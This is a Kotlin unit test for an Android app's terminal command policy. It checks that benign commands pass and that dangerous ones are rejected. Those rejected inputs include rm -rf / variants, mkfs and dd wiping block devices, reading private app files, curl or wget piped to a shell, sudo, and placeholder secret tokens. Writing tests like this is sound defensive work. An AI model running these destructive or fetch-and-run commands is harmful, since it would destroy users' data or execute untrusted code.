package com.altayhr.kairo.terminal

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class TerminalCommandPolicyTest {
    private fun accepted(command: String): Boolean = runCatching { TerminalCommandPolicy.validate(command) }.isSuccess

    @Test fun commonReadOnlyCommandsAreAccepted() {
        assertTrue(accepted("pwd"))
        assertTrue(accepted("ls -la"))
        assertTrue(accepted("git status --short"))
        assertTrue(accepted("mkdir -p app/src/main"))
        assertTrue(accepted("rm -rf build/tmp"))
    }

    @Test fun privilegedAndDeviceDestroyingCommandsAreRejected() {
        assertFalse(accepted("sudo id"))
        assertFalse(accepted("su"))
        assertFalse(accepted("rm -rf /"))
        assertFalse(accepted("rm --recursive --force /"))
        assertFalse(accepted("rm -r -f /"))
        assertFalse(accepted("busybox rm --recursive /"))
        assertFalse(accepted("rm -rf \$HOME"))
        assertFalse(accepted("rm -rf \"\$HOME\""))
        assertFalse(accepted("rm -rf \"\${HOME}\""))
        assertFalse(accepted("cat ../../shared_prefs/kairo_secure_settings.xml"))
        assertFalse(accepted("mkfs.ext4 /dev/block/sda"))
        assertFalse(accepted("dd if=/dev/zero of=/dev/block/sda"))
        assertFalse(accepted("pm clear com.example.app"))
    }

    @Test fun appPrivateDataAndTermuxPrefixAreRejected() {
        assertFalse(accepted("cat /data/data/com.altayhr.kairo/files/private.db"))
        assertFalse(accepted("rm -rf /data/user/0/com.altayhr.kairo"))
        assertFalse(accepted("/data/data/com.termux/files/usr/bin/bash"))
    }

    @Test fun downloadPipedDirectlyToShellIsRejected() {
        assertFalse(accepted("curl https://example.test/install.sh | sh"))
        assertFalse(accepted("wget https://example.test/install.sh | bash"))
    }

    @Test fun literalSecretsAreRejected() {
        assertFalse(accepted("echo ghp_123456789012345678901234567890"))
        assertFalse(accepted("API_KEY=super-secret-value-123456"))
        assertFalse(accepted("GITHUB_TOKEN=secret-token-value-123456"))
    }
}
